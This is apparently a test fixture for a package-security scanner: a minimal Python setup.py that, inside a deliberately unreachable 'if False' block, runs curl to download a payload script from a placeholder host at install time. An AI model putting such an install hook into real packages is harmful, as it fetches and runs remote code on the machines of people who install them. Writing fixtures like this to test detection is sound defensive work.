import subprocess

from setuptools import setup

# Static scanner fixture only. The suspicious call is unreachable so this
# file remains harmless even if someone accidentally invokes setup.py.
if False:
    subprocess.run(
        ["curl", "https://pypi-setup-subprocess.example.invalid/payload.py"],
        check=True,
    )

setup(name="pypi-setup-subprocess", version="1.0.0")
